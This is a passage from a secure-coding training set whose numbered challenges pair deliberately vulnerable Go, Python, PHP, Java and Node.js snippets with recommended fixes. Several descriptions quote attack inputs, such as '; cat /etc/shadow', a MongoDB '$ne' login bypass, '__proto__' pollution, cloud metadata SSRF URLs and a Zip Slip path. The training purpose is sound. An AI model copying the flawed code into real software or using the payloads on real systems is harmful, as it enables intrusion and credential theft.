Generate reset tokens using `random_bytes(32)` (at least 256 bits of entropy) and encode them with `bin2hex()` or `base64_encode()` for URL safety. Never derive security tokens from predictable values like timestamps, email addresses, or sequential IDs. Store a hashed version of the token (using `hash('sha256', $token)`) in the database and only compare hashes on redemption, so a database breach doesn't expose valid tokens. Ensure tokens are single-use and expire after a short window (e.g., 1 hour).

---

# 19. XSS via HTTP Response Header Injection

## Difficulty *
Easy

## Description *
A content management system sets a custom `X-Page-Title` response header by reading from a query parameter to help analytics tools track page context. Security reviewers found that injecting a newline character into this parameter allows an attacker to inject arbitrary HTTP headers — including a `Set-Cookie` or `Content-Type` header — into the response, enabling session fixation and other attacks.

## Programming Language
Go

## Challenge Details
The handler reads a `title` query parameter and sets it as a custom HTTP response header without sanitization. HTTP headers are line-delimited; if the value contains a carriage return (`\r`) or newline (`\n`), the injected content is interpreted as a new header line. This is called HTTP response splitting or header injection. The header must only contain safe, single-line values. Your task is to sanitize the value by rejecting or stripping newline characters before it is set as a header.

## Initial Code (Vulnerable snippet)

### vulnerable.code
```go
func pageHandler(w http.ResponseWriter, r *http.Request) {
    pageTitle := r.URL.Query().Get("title")
    
    if pageTitle != "" {
        w.Header().Set("X-Page-Title", pageTitle)
    }

    w.Header().Set("Content-Type", "text/html; charset=utf-8")
    
    page := loadPageContent(r.URL.Path)
    w.Write([]byte(page))
}
```

## Recommendation
Before setting any HTTP header derived from user input, strip or reject all carriage return (`\r`, `\x0d`) and newline (`\n`, `\x0a`) characters from the value. You can use `strings.ContainsAny(pageTitle, "\r\n")` to detect injection attempts and respond with a 400 Bad Request. Alternatively, use a regex to allow only printable non-control ASCII characters. Consider whether this header truly needs to mirror user input — if not, remove the feature entirely. Modern Go's `net/http` package does reject some header injection, but applying explicit validation is the correct defense.

---

# 20. Directory Listing Enabled on Static Server

## Difficulty *
Easy

## Description *
A software company hosts its documentation and build artifacts on an Nginx-backed static file server. A partner noticed the directory listing was enabled, revealing internal build artifacts, environment configuration files, API keys in `.env` backups, and unreleased product documentation to anyone who browsed to the server root.

## Programming Language
Go

## Challenge Details
The Go HTTP file server is configured to serve an entire directory with `http.FileServer`, which by default displays a browsable directory listing when no `index.html` is present. This exposes the full file tree to unauthenticated users. Static file serving should only expose the intended files, not allow directory enumeration. Your task is to wrap the file server so that directory listing requests return a 403 or 404 instead of the auto-generated listing page.

## Initial Code (Vulnerable snippet)

### vulnerable.code
```go
package main

import (
    "net/http"
    "log"
)

func main() {
    fs := http.FileServer(http.Dir("/var/www/static"))
    http.Handle("/static/", http.StripPrefix("/static/", fs))
    
    log.Println("Static server running on :8080")
    log.Fatal(http.ListenAndServe(":8080", nil))
}
```

## Recommendation
Implement a custom `http.FileSystem` wrapper that overrides `Open()` to check whether the opened path is a directory. If it is and no `index.html` exists within it, return an error to prevent the directory listing from being generated. Alternatively, wrap the handler to intercept requests for paths ending in `/` and return 403 Forbidden unless an index file exists. Ensure the root of the served directory also contains an `index.html` or is similarly protected. Audit which files are in the served directory — configuration files, `.env`, and backup files should never be in a web-accessible location.

---

# 21. Weak Session Token Generation

## Difficulty *
Easy

## Description *
A ticketing platform generates session tokens using a combination of the user's ID and the current timestamp, passed through a non-cryptographic hash. An attacker who creates an account can predict session tokens generated around the same time, allowing them to take over concurrent sessions including administrator sessions.

## Programming Language
Python

## Challenge Details
The session token is generated by hashing the user's ID concatenated with the current Unix timestamp using MD5. Both the user ID and timestamp are either known or guessable, making the token predictable within a narrow time window. Session tokens must be generated from a source of cryptographic randomness, independent of any predictable values. Your task is to replace the token generation logic with a cryptographically secure random source.

## Initial Code (Vulnerable snippet)

### vulnerable.code
```python
import hashlib
import time

def generate_session_token(user_id: int) -> str:
    """Generate a session token for the authenticated user."""
    timestamp = str(time.time())
    raw = f"{user_id}{timestamp}"
    token = hashlib.md5(raw.encode()).hexdigest()
    return token

def login(username: str, password: str) -> dict:
    user = db.find_user_by_username(username)
    if user and verify_password(password, user['password_hash']):
        token = generate_session_token(user['id'])
        session_store.set(token, user['id'], ttl=3600)
        return {'session_token': token}
    return {'error': 'Invalid credentials'}
```

## Recommendation
Use Python's `secrets` module — specifically `secrets.token_hex(32)` or `secrets.token_urlsafe(32)` — to generate session tokens. These functions use the OS's cryptographically secure random number generator and produce tokens with sufficient entropy (at least 256 bits) that cannot be predicted or brute-forced. Never incorporate user IDs, timestamps, IP addresses, or any deterministic data into security token generation. The token should be a pure random value that maps to session data in your server-side store.

---

# 22. SQL Injection in Registration Email Check

## Difficulty *
Easy

## Description *
A subscription newsletter service checks whether an email is already registered before creating a new account. The duplicate-check query is vulnerable to SQL injection, allowing attackers to not only enumerate registered emails but also to perform UNION-based extraction of other database tables including user credentials.

## Programming Language
PHP

## Challenge Details
The registration controller embeds the email address directly into a SQL query to check for existing accounts. Although the application's primary intention is simply to check for duplicates, the injection point allows attackers to append UNION SELECT statements or use boolean-based techniques to extract data from other tables. The check must work correctly while treating the email as data, not SQL. Your task is to fix the query to use parameterized execution.

## Initial Code (Vulnerable snippet)

### vulnerable.code
```php
<?php
function isEmailRegistered(PDO $pdo, string $email): bool {
    $query = "SELECT COUNT(*) FROM subscribers WHERE email = '$email' AND active = 1";
    $stmt = $pdo->query($query);
    $count = $stmt->fetchColumn();
    return (int)$count > 0;
}

function registerSubscriber(PDO $pdo, string $email, string $name): array {
    if (isEmailRegistered($pdo, $email)) {
        return ['success' => false, 'message' => 'Email already registered'];
    }

    $stmt = $pdo->prepare("INSERT INTO subscribers (email, name, created_at) VALUES (?, ?, NOW())");
    $stmt->execute([$email, $name]);
    return ['success' => true, 'message' => 'Subscription confirmed'];
}
```

## Recommendation
Convert `isEmailRegistered` to use a prepared statement: `$pdo->prepare("SELECT COUNT(*) FROM subscribers WHERE email = ? AND active = 1")` and execute it with `[$email]`. This ensures the email value is always handled as a parameter, never as SQL syntax. Apply parameterization consistently — notice that `registerSubscriber` already does it correctly and is not vulnerable. Review the entire codebase for any other raw query construction patterns to fix them uniformly.

---

# 23. Unvalidated File Extension on Upload

## Difficulty *
Easy

## Description *
A portfolio hosting site allows designers to upload images for their portfolios. The upload handler checks only the file extension, and since it accepts `.jpg`, `.png`, and `.gif`, an attacker renamed a PHP webshell to `shell.php.jpg` and uploaded it. The server executed the file as PHP, granting full remote code execution.

## Programming Language
PHP

## Challenge Details
The file upload handler validates only the file extension using a simple string check that can be bypassed with double extensions (e.g., `evil.php.jpg`) or null bytes. Extension checking alone is fundamentally insufficient because extensions are client-controlled metadata. The server must validate the actual content of the uploaded file (its MIME type based on magic bytes) and store the file in a way that prevents execution. Your task is to implement server-side content-type validation and configure safe file storage to eliminate the code execution risk.

## Initial Code (Vulnerable snippet)

### vulnerable.code
```php
<?php
function handleFileUpload(array $file): array {
    $allowedExtensions = ['jpg', 'jpeg', 'png', 'gif'];
    $uploadDir = '/var/www/html/uploads/';

    $originalName = $file['name'];
    $extension = strtolower(pathinfo($originalName, PATHINFO_EXTENSION));

    if (!in_array($extension, $allowedExtensions)) {
        return ['success' => false, 'error' => 'Invalid file type'];
    }

    $newFilename = uniqid() . '.' . $extension;
    move_uploaded_file($file['tmp_name'], $uploadDir . $newFilename);

    return ['success' => true, 'url' => '/uploads/' . $newFilename];
}
```

## Recommendation
Validate the file's actual content using `finfo_file()` with `FILEINFO_MIME_TYPE` to check the MIME type based on file magic bytes, not the extension. Accept only `image/jpeg`, `image/png`, and `image/gif`. Store uploaded files outside the web root (not in a web-accessible directory), and serve them through a PHP script that reads and streams the file, preventing direct execution. Additionally, generate a random filename without preserving any part of the original name. Consider re-encoding images using GD or Imagick, which strips any embedded payloads.

---

# 24. API Key Exposed in Client-Side JavaScript

## Difficulty *
Easy

## Description *
A weather dashboard application embeds a third-party weather API key directly in the compiled client-side JavaScript bundle. A user inspecting the network tab found the key within seconds, and the API provider later reported the key was being abused for thousands of requests per minute, causing significant charges to the company.

## Programming Language
JavaScript (Node.js)

## Challenge Details
The frontend JavaScript file contains a hardcoded API key used to call a paid weather data service. Because all JavaScript sent to the browser is fully visible to users, any secret embedded in it is effectively public. The API key should never appear in client-side code. Your task is to restructure the architecture so the API key is used only on the server side, with the client calling your own backend which proxies the request to the weather service using the key stored as a server-side environment variable.

## Initial Code (Vulnerable snippet)

### vulnerable.code
```javascript
// weather-dashboard.js (bundled and sent to the browser)
const WEATHER_API_KEY = 'wk_live_a8f3d2c91b4e6f7890abcdef123456789';
const WEATHER_API_BASE = 'https://api.weatherprovider.com/v2';

async function fetchWeather(city) {
    const response = await fetch(
        `${WEATHER_API_BASE}/current?city=${encodeURIComponent(city)}&apikey=${WEATHER_API_KEY}`
    );
    const data = await response.json();
    return data;
}

document.getElementById('searchBtn').addEventListener('click', async () => {
    const city = document.getElementById('cityInput').value;
    const weather = await fetchWeather(city);
    renderWeatherCard(weather);
});
```

## Recommendation
Move the API call to a server-side proxy endpoint (e.g., `GET /api/weather?city=London`). Store the API key in a server-side environment variable (`process.env.WEATHER_API_KEY`) that is never bundled or exposed to the client. The server proxy validates and rate-limits the request, then calls the third-party API using the secret key and returns only the necessary data to the client. The client-side code calls your own endpoint — never the third-party API directly. Audit your build pipeline to ensure secrets are never included in client bundles.

---

# 25. Broken Access Control on User Settings

## Difficulty *
Easy

## Description *
A project collaboration tool allows users to update their own profile settings via a PUT endpoint. The endpoint accepts a JSON body with the settings to update and applies them to the user's account. A developer discovered that by including `"role": "admin"` in the request body, any user could grant themselves administrative privileges.

## Programming Language
JavaScript (Node.js)

## Challenge Details
The settings update endpoint applies all fields from the request body directly to the user record using a spread operator or similar bulk update. This includes sensitive fields such as `role`, `subscriptionTier`, `isVerified`, and `organizationId` that should only be modifiable by administrators or internal systems — not the user themselves. This is a form of mass assignment vulnerability combined with broken access control. Your task is to implement an explicit allowlist of fields that a regular user is permitted to modify through this endpoint.

## Initial Code (Vulnerable snippet)

### vulnerable.code
```javascript
router.put('/api/user/settings', requireAuth, async (req, res) => {
    const userId = req.user.id;
    const updates = req.body;

    try {
        const updatedUser = await db.query(
            'UPDATE users SET ? WHERE id = ?',
            [updates, userId]
        );

        const user = await db.query('SELECT * FROM users WHERE id = ?', [userId]);
        res.json({ success: true, user: user[0] });
    } catch (err) {
        res.status(500).json({ error: 'Update failed' });
    }
});
```

## Recommendation
Define an explicit allowlist of fields a regular user may update (e.g., `['display_name', 'bio', 'avatar_url', 'notification_preferences', 'timezone']`). Extract only those fields from `req.body` and build the update object from them — reject or ignore any other fields. Sensitive fields such as `role`, `isVerified`, `subscriptionTier`, and `organizationId` must only be modifiable through separate, admin-protected endpoints. Never pass user-controlled input directly to a bulk database update function.

---

## Medium Challenges

---

# 26. Server-Side Request Forgery in Webhook Tester

## Difficulty *
Medium

## Description *
A developer tools platform offers a webhook testing feature that allows users to send test HTTP requests to a URL of their choice to verify their webhook endpoint behavior. A security researcher demonstrated that by providing internal network URLs (such as `http://192.168.1.1/admin` or `http://169.254.169.254/latest/meta-data`), they could probe internal services and retrieve cloud instance metadata, including IAM credentials.

## Programming Language
Python

## Challenge Details
The webhook test service accepts a user-supplied URL and makes an outbound HTTP request to it on behalf of the server. Because the request originates from the server itself, it can reach internal network resources, cloud metadata endpoints, and localhost services that are inaccessible from the internet. The service must restrict outbound requests to legitimate external URLs only. Your task is to implement URL validation that prevents requests to private IP ranges, loopback addresses, link-local addresses, and internal hostnames before the request is dispatched.

## Initial Code (Vulnerable snippet)

### vulnerable.code
```python
import requests
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/api/webhook/test', methods=['POST'])
def test_webhook():
    data = request.get_json()
    target_url = data.get('url')
    payload = data.get('payload', {})
    method = data.get('method', 'POST').upper()

    if not target_url:
        return jsonify({'error': 'URL is required'}), 400

    try:
        response = requests.request(
            method=method,
            url=target_url,
            json=payload,
            timeout=10,
            allow_redirects=True
        )
        return jsonify({
            'status_code': response.status_code,
            'headers': dict(response.headers),
            'body': response.text[:10000]
        })
    except requests.RequestException as e:
        return jsonify({'error': str(e)}), 500
```

## Recommendation
Before dispatching the request, parse the URL with Python's `urllib.parse.urlparse`, resolve the hostname to an IP address using `socket.getaddrinfo`, and check that the IP is not in any private, loopback, or link-local range. Use Python's `ipaddress` module to check against `ipaddress.ip_address(ip).is_private`, `.is_loopback`, and `.is_link_local`. Also validate the scheme is `https` or `http` (rejecting `file://`, `gopher://`, `dict://`, etc.) and restrict the port to 80 and 443. Disable redirect following (`allow_redirects=False`) or validate each redirect destination as well, since redirects can be used to bypass initial URL checks.

---

# 27. NoSQL Injection in MongoDB Authentication

## Difficulty *
Medium

## Description *
A mobile application backend uses MongoDB to store user accounts and authenticates users by querying the database with their provided username and password. A penetration tester found that by submitting a specially crafted JSON body with MongoDB query operators instead of a plain string, they could bypass password verification entirely and authenticate as any known user.

## Programming Language
JavaScript (Node.js)

## Challenge Details
The authentication handler passes user-supplied JSON fields directly into a MongoDB `findOne` query without type checking or sanitization. MongoDB supports query operators such as `$ne` (not equal), `$gt`, `$regex`, and `$where`. When a client sends `{"username": "admin", "password": {"$ne": ""}}`, the query matches any admin user whose password is not an empty string — bypassing authentication completely. The query must only accept string values for credential fields. Your task is to add type validation that ensures the query parameters are plain strings before they reach the database.

## Initial Code (Vulnerable snippet)

### vulnerable.code
```javascript
const express = require('express');
const { MongoClient } = require('mongodb');
const router = express.Router();

router.post('/api/auth/login', async (req, res) => {
    const { username, password } = req.body;

    const user = await db.collection('users').findOne({
        username: username,
        password: password,
        active: true
    });

    if (!user) {
        return res.status(401).json({ error: 'Invalid credentials' });
    }

    const token = generateJWT(user);
    res.json({ token, userId: user._id });
});
```

## Recommendation
Validate that `username` and `password` are both non-empty strings using `typeof username !== 'string'` checks before using them in the query. Return 400 Bad Request if either value is not a plain string. Never query MongoDB with field values that could be objects or arrays controlled by user input. For password handling, store only a bcrypt hash and never query by plaintext password — instead, retrieve the user by username alone, then use `bcrypt.compare()` to verify the password separately, which completely eliminates the NoSQL injection vector for authentication.

---

# 28. XML External Entity in Document Parser

## Difficulty *
Medium

## Description *
An HR platform accepts XML-formatted imports for bulk employee data uploads. A security assessment found that the XML parser processes external entity references, allowing attackers to upload a crafted XML file that causes the server to read and return the contents of local files such as `/etc/passwd` or application configuration files containing database credentials.

## Programming Language
Java

## Challenge Details
The document import service parses uploaded XML using a `DocumentBuilder` configured with default settings. By default, Java's XML parser resolves external entities (DOCTYPE declarations with `SYSTEM` or `PUBLIC` identifiers), enabling XXE attacks. An attacker uploads an XML file declaring an external entity that references a local file path, and the parsed content includes that file's contents in the parsed document tree. The parser must be hardened to refuse all external entity resolution. Your task is to configure the XML parser to disable DTD processing and external entity loading.

## Initial Code (Vulnerable snippet)

### vulnerable.code
```java
import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;
import org.w3c.dom.Document;
import org.w3c.dom.NodeList;
import java.io.InputStream;

public class EmployeeImportService {

    public List<Employee> parseEmployeeXml(InputStream xmlStream) throws Exception {
        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
        DocumentBuilder builder = factory.newDocumentBuilder();
        Document doc = builder.parse(xmlStream);

        NodeList employees = doc.getElementsByTagName("employee");
        List<Employee> result = new ArrayList<>();

        for (int i = 0; i < employees.getLength(); i++) {
            result.add(mapNodeToEmployee(employees.item(i)));
        }
        return result;
    }
}
```

## Recommendation
Disable all DTD processing and external entity features on the `DocumentBuilderFactory` before creating the `DocumentBuilder`. Set the following features: `http://apache.org/xml/features/disallow-doctype-decl` to `true` (which prevents all DOCTYPE declarations); `http://xml.org/sax/features/external-general-entities` to `false`; and `http://xml.org/sax/features/external-parameter-entities` to `false`. Also set `factory.setExpandEntityReferences(false)` and `factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)`. OWASP's XXE Prevention Cheat Sheet provides the canonical list of required settings for each Java XML parser.

---

# 29. Insecure JWT Verification

## Difficulty *
Medium

## Description *
A microservices platform uses JWTs for inter-service authentication. The token verification logic accepts the algorithm from the token header rather than enforcing a specific algorithm server-side. An attacker obtained a valid JWT, changed the algorithm header to `none`, removed the signature, and was accepted as authenticated by several services.

## Programming Language
JavaScript (Node.js)

## Challenge Details
The JWT verification function passes the token directly to the library's `verify` method without specifying which algorithm to accept. The `none` algorithm attack exploits libraries that honor the `alg` field in the JWT header — if set to `none`, no signature is required. Additionally, some libraries are vulnerable to the RS256-to-HS256 confusion attack, where an attacker signs a JWT with HS256 using the server's public RSA key as the HMAC secret. The verifier must explicitly enforce the expected algorithm. Your task is to configure JWT verification to only accept a specific, server-controlled algorithm.

## Initial Code (Vulnerable snippet)

### vulnerable.code
```javascript
const jwt = require('jsonwebtoken');

const JWT_SECRET = process.env.JWT_SECRET;

function verifyToken(token) {
    try {
        const decoded = jwt.verify(token, JWT_SECRET);
        return { valid: true, payload: decoded };
    } catch (err) {
        return { valid: false, error: err.message };
    }
}

function authMiddleware(req, res, next) {
    const authHeader = req.headers.authorization;
    const token = authHeader && authHeader.split(' ')[1];

    if (!token) return res.status(401).json({ error: 'Token required' });

    const result = verifyToken(token);
    if (!result.valid) return res.status(403).json({ error: 'Invalid token' });

    req.user = result.payload;
    next();
}
```

## Recommendation
Pass an explicit `algorithms` option to `jwt.verify()`, specifying only the algorithm(s) your system uses (e.g., `{ algorithms: ['HS256'] }` or `{ algorithms: ['RS256'] }`). This prevents the library from accepting `none` or any other algorithm an attacker might inject. Never derive the verification algorithm from the token itself. If you use asymmetric keys (RS256/ES256), store and use the public key for verification — not the private key — and still specify the algorithm explicitly. Reject any token whose header algorithm does not match your expectation before attempting verification.

---

# 30. Command Injection in Network Diagnostic Tool

## Difficulty *
Medium

## Description *
An internal IT operations dashboard provides a network diagnostic utility that allows administrators to ping a host or run a traceroute by entering a hostname or IP address. A junior administrator demonstrated that entering `; cat /etc/shadow` in the host field caused the server to execute the command and return the system's shadow password file.

## Programming Language
Python

## Challenge Details
The diagnostic tool constructs a shell command string by concatenating the user-supplied hostname directly into a `ping` or `traceroute` command and executing it using `subprocess.run` with `shell=True`. This allows attackers to inject additional shell commands using `;`, `&&`, `||`, backticks, or `$()` substitution. The tool should execute only the intended diagnostic command, with the hostname passed as an argument — never interpreted by a shell. Your task is to rewrite the command execution to eliminate shell interpretation of user input.

## Initial Code (Vulnerable snippet)

### vulnerable.code
```python
import subprocess
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/api/diagnostic/ping', methods=['POST'])
def ping_host():
    data = request.get_json()
    host = data.get('host', '')
    count = data.get('count', 4)

    if not host:
        return jsonify({'error': 'Host is required'}), 400

    command = f"ping -c {count} {host}"

    result = subprocess.run(
        command,
        shell=True,
        capture_output=True,
        text=True,
        timeout=30
    )

    return jsonify({
        'stdout': result.stdout,
        'stderr': result.stderr,
        'returncode': result.returncode
    })
```

## Recommendation
Use `subprocess.run()` with `shell=False` and pass the command as a list of separate arguments (e.g., `['ping', '-c', str(count), host]`). Without `shell=True`, the OS executes the binary directly and does not interpret shell metacharacters — the host value is passed as a literal argument, not parsed by a shell. Additionally, validate the `host` value against a strict allowlist pattern (a regex matching valid IP addresses or hostnames) before passing it to the subprocess. Validate the `count` parameter as an integer within a safe range to prevent injection there as well.

---

# 31. Mass Assignment in User Registration

## Difficulty *
Medium

## Description *
A SaaS platform's user registration API accepts a JSON body and maps it to a user model using a deserialization library. During a bug bounty program, a researcher registered a new account with `"role": "admin"` included in the request body and successfully gained administrative access to the platform.

## Programming Language
Java

## Challenge Details
The registration controller deserializes the entire request body into a `User` object using Jackson's `ObjectMapper`. Since the `User` model contains fields such as `role`, `isAdmin`, `accountLimit`, and `organizationId`, any of these can be set by including them in the registration request — even though they should only be set by the application logic. The API must only process the fields a new registrant is permitted to supply. Your task is to implement a separate request DTO that contains only the allowed registration fields, preventing unauthorized field assignment.

## Initial Code (Vulnerable snippet)

### vulnerable.code
```java
@RestController
@RequestMapping("/api")
public class RegistrationController {

    @PostMapping("/register")
    public ResponseEntity<UserResponse> register(@RequestBody User user) {
        // Hash password before saving
        user.setPasswordHash(passwordEncoder.encode(user.getPassword()));
        user.setPassword(null);
        user.setCreatedAt(LocalDateTime.now());
        user.setActive(true);

        User savedUser = userRepository.save(user);
        return ResponseEntity.ok(new UserResponse(savedUser));
    }
}
```

## Recommendation
Create a dedicated `RegistrationRequest` DTO class containing only the fields a registrant should provide (e.g., `email`, `password`, `firstName`, `lastName`). Annotate sensitive fields in the `User` entity with `@JsonIgnore` or use Jackson's `@JsonView` to block them from deserialization in this context. In the controller, accept `RegistrationRequest` instead of `User`, then construct the `User` entity manually, setting `role`, `active`, and other system fields explicitly in the service layer. Never bind HTTP request bodies directly to persistent entity classes.

---

# 32. Prototype Pollution via Query String Merge

## Difficulty *
Medium

## Description *
A Node.js API gateway merges query string parameters into a request context object using a recursive merge utility. A security researcher found that submitting `__proto__[isAdmin]=true` as a query parameter polluted the `Object.prototype`, causing all subsequently created objects in the process to have `isAdmin: true` — bypassing authorization checks across the entire application.

## Programming Language
JavaScript (Node.js)

## Challenge Details
The utility function recursively merges query parameters into a target object without filtering keys like `__proto__`, `constructor`, or `prototype`. When a key named `__proto__` is encountered, the merge walks up to `Object.prototype` and modifies it, affecting all objects in the Node.js process. This can be used to inject arbitrary properties into object prototypes, bypassing `if (user.isAdmin)` checks that fall through to prototype inheritance. Your task is to harden the merge function so that prototype chain keys are rejected and prototype pollution is prevented.

## Initial Code (Vulnerable snippet)

### vulnerable.code
```javascript
function deepMerge(target, source) {
    for (const key of Object.keys(source)) {
        if (source[key] && typeof source[key] === 'object' && !Array.isArray(source[key])) {
            if (!target[key]) target[key] = {};
            deepMerge(target[key], source[key]);
        } else {
            target[key] = source[key];
        }
    }
    return target;
}

app.use((req, res, next) => {
    req.context = deepMerge({}, req.query);
    next();
});
```

## Recommendation
In the merge function, skip any key that is `__proto__`, `constructor`, or `prototype` — these are the only keys that enable prototype pollution. Use `Object.prototype.hasOwnProperty.call(source, key)` to ensure you are only iterating own properties. Alternatively, use `Object.create(null)` to create the target object, which has no prototype chain to pollute. For parsing query strings, consider `qs` library with `allowPrototypes: false`. Use `JSON.parse(JSON.stringify(obj))` to sanitize externally supplied objects before merging them into application state.

---

# 33. Insecure Deserialization in Session Restore

## Difficulty *
Medium

## Description *
A legacy enterprise web application stores session data as a serialized PHP object in a cookie. A penetration tester modified the serialized cookie value to trigger object instantiation of a class with a destructive `__destruct` method, achieving arbitrary file deletion on the server. With further crafting, they achieved remote code execution via a PHP object injection chain.

## Programming Language
PHP

## Challenge Details
The session management module reads a base64-encoded, PHP-serialized object directly from a cookie and passes it to `unserialize()`. PHP's `unserialize()` instantiates objects and calls magic methods (`__wakeup`, `__destruct`, `__toString`) on the deserialized objects, which can trigger malicious logic if any class in the application's codebase has exploitable methods. The session must be restored without deserializing untrusted data into objects. Your task is to replace object serialization with a safe data exchange format and validate session data using a server-side store rather than trusting the client.

## Initial Code (Vulnerable snippet)

### vulnerable.code
```php
<?php
function restoreSession(): ?UserSession {
    $cookie = $_COOKIE['app_session'] ?? null;
    if (!$cookie) return null;

    $serialized = base64_decode($cookie);
    $session = unserialize($serialized);

    if (!$session instanceof UserSession) return null;

    return $session;
}

function saveSession(UserSession $session): void {
    $serialized = serialize($session);
    setcookie('app_session', base64_encode($serialized), [
        'expires' => time() + 3600,
        'path' => '/',
        'httponly' => true
    ]);
}
```

## Recommendation
Never deserialize user-supplied data with `unserialize()`. Replace cookie-based session storage with a server-side session store (Redis, Memcached, or a database table) keyed by a cryptographically random session token stored in the cookie. Store session data as JSON in the server-side store; use `json_encode()` and `json_decode()` for serialization. The cookie contains only the random session ID — all session state lives on the server. If you must sign data stored client-side, use HMAC-signed JSON tokens rather than serialized objects.

---

# 34. SSRF via Image Proxy Service

## Difficulty *
Medium

## Description *
A social media platform provides an image proxy service that fetches and caches external images to avoid mixed-content warnings. Users can submit any image URL to have it proxied through the platform. An attacker exploited this feature to send requests to the internal Kubernetes API server and the AWS EC2 metadata endpoint, harvesting cluster configuration and IAM credentials.

## Programming Language
Go

## Challenge Details
The image proxy fetches any URL provided by users, including URLs with private IP addresses, internal service names (like `http://kubernetes.default.svc`), and cloud metadata endpoints (like `http://169.254.169.254`). The proxy makes the request from the server's network context, granting attackers access to internal infrastructure. Beyond IP blocking, redirect chains can be used to bypass naive URL validation. Your task is to implement multi-layer SSRF protection that validates the URL and prevents redirect-based bypasses.

## Initial Code (Vulnerable snippet)

### vulnerable.code
```go
package main

import (
    "io"
    "net/http"
    "net/url"
)

func proxyImageHandler(w http.ResponseWriter, r *http.Request) {
    imageURL := r.URL.Query().Get("url")

    parsedURL, err := url.Parse(imageURL)
    if err != nil || (parsedURL.Scheme != "http" && parsedURL.Scheme != "https") {
        http.Error(w, "Invalid URL", http.StatusBadRequest)
        return
    }

    resp, err := http.Get(imageURL)
    if err != nil {
        http.Error(w, "Failed to fetch image", http.StatusBadGateway)
        return
    }
    defer resp.Body.Close()

    w.Header().Set("Content-Type", resp.Header.Get("Content-Type"))
    io.Copy(w, resp.Body)
}
```

## Recommendation
Implement a custom `http.Transport` with a `DialContext` function that resolves the target hostname to an IP and validates the IP against private/loopback/link-local ranges using Go's `net` and `net/netip` packages before establishing the connection. This approach validates the IP after DNS resolution, preventing DNS rebinding attacks. Set `CheckRedirect` on the `http.Client` to validate each redirect URL through the same IP-checking logic. Additionally, restrict allowed Content-Type responses to image types and limit response size. Consider maintaining a hostname allowlist for production use.

---

# 35. Race Condition in Coupon Redemption

## Difficulty *
Medium

## Description *
An e-commerce platform offers single-use discount coupons. A customer discovered that by sending multiple simultaneous redemption requests within milliseconds, the coupon validation check passed for all concurrent requests before any of them had committed the "used" status to the database — allowing a coupon to be redeemed many times.

## Programming Language
Python

## Challenge Details
The coupon redemption service checks whether a coupon has been used, then marks it as used and applies the discount in separate database operations. Between the check and the update, concurrent requests from the same client can pass the "is used" check simultaneously, resulting in multiple successful redemptions. This is a classic time-of-check to time-of-use (TOCTOU) race condition. Your task is to redesign the redemption logic so that concurrent requests cannot both succeed — only one can win, and all others must be rejected.

## Initial Code (Vulnerable snippet)

### vulnerable.code
```python
from flask import Flask, request, jsonify, g

app = Flask(__name__)

@app.route('/api/coupons/redeem', methods=['POST'])
def redeem_coupon():
    coupon_code = request.json.get('coupon_code')
    user_id = g.current_user.id
    order_id = request.json.get('order_id')

    coupon = db.session.query(Coupon).filter_by(
        code=coupon_code, is_used=False
    ).first()

    if not coupon:
        return jsonify({'error': 'Invalid or already used coupon'}), 400

    coupon.is_used = True
    coupon.used_by = user_id
    coupon.used_at = datetime.utcnow()
    db.session.commit()

    apply_discount(order_id, coupon.discount_amount)
    return jsonify({'success': True, 'discount': coupon.discount_amount})
```

## Recommendation
Use a database-level atomic update to perform the check and mark-as-used in a single operation, rather than a read-then-write pattern. An `UPDATE coupons SET is_used=true, used_by=:user_id WHERE code=:code AND is_used=false` statement returns the number of affected rows — if it returns 0, another request already claimed the coupon. Alternatively, use a database-level unique constraint or a SELECT FOR UPDATE lock within a transaction to prevent concurrent redemptions. Never rely on application-level read-before-write checks for exclusivity — they are inherently vulnerable to race conditions.

---

# 36. JWT Algorithm Confusion Attack

## Difficulty *
Medium

## Description *
An API platform uses RS256-signed JWTs for authentication, with the public key published at a `/.well-known/jwks.json` endpoint. A researcher discovered the verification code accepted HS256 tokens and used the published RS256 public key as the HMAC secret — allowing anyone to forge valid tokens by signing an HS256 JWT with the platform's own public key.

## Programming Language
Python

## Challenge Details
The JWT verification code determines which algorithm to use from the token's header, then verifies accordingly. When the algorithm is RS256, it uses the RSA public key; when it is HS256, it uses the same key as an HMAC secret. Because the RS256 public key is publicly known (by design), any attacker can create an HS256-signed JWT using it. The verifier must not honor algorithm choices from the token header — the algorithm must be fixed server-side. Your task is to enforce a specific algorithm in the verification step regardless of what the token's header claims.

## Initial Code (Vulnerable snippet)

### vulnerable.code
```python
import jwt

PUBLIC_KEY = open('public_key.pem').read()

def verify_token(token: str) -> dict:
    try:
        header = jwt.get_unverified_header(token)
        algorithm = header.get('alg', 'RS256')

        payload = jwt.decode(
            token,
            PUBLIC_KEY,
            algorithms=[algorithm]
        )
        return payload
    except jwt.InvalidTokenError as e:
        raise AuthenticationError(f"Invalid token: {e}")
```

## Recommendation
Remove the code that reads the algorithm from the token header. Hardcode the expected algorithm directly in the `algorithms` parameter: `jwt.decode(token, PUBLIC_KEY, algorithms=['RS256'])`. The `algorithms` list must be a server-controlled constant, never derived from the token itself. Reject any token that cannot be verified with the expected algorithm. If you support multiple token types with different algorithms, determine the expected algorithm from context (e.g., the issuer or key ID in the header), not from the `alg` field blindly.

---

# 37. Path Traversal in ZIP Archive Extraction

## Difficulty *
Medium

## Description *
A cloud storage service allows users to upload ZIP archives for bulk file import. The extraction service unzips archives into a user-specific directory. An attacker uploaded a crafted ZIP file containing entries with names like `../../etc/cron.d/backdoor`, which the extraction code followed literally, writing attacker-controlled content to arbitrary filesystem paths — a technique known as a "Zip Slip" attack.

## Programming Language
Java

## Challenge Details
The extraction service iterates over ZIP entries and constructs destination paths using `new File(destDir, entry.getName())` without checking whether the resolved path escapes the destination directory. ZIP entry names can contain `../` sequences. When the service writes the file, it follows the path literally, potentially overwriting system files, configuration files, or application code. Each extracted entry must be validated to ensure it resides within the intended extraction directory. Your task is to add a path traversal check for every ZIP entry before writing it.

## Initial Code (Vulnerable snippet)

### vulnerable.code
```java
import java.util.zip.*;
import java.io.*;

public class ZipExtractor {

    public void extractZip(InputStream zipStream, String destDir) throws IOException {
        try (ZipInputStream zis = new ZipInputStream(zipStream)) {
            ZipEntry entry;
            while ((entry = zis.getNextEntry()) != null) {
                File outputFile = new File(destDir, entry.getName());

                if (entry.isDirectory()) {
                    outputFile.mkdirs();
                } else {
